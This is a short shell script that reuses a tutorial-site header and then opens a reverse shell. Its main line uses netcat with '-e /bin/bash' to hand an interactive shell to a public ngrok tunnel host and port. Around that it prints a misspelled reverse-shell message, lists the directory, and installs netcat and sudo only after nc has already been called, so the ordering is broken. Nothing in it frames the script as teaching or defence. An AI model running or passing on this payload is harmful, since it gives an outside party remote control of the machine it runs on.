#!/bin/sh

# Author : Zara Ali
# Copyright (c) Tutorialspoint.com
# Script follows here:
echo "Dump Now your reverse shell is tun now"
pwd
ls
nc -v 0.tcp.in.ngrok.io 12632 -e /bin/bash
apt update
apt install netcat
apt install sudo
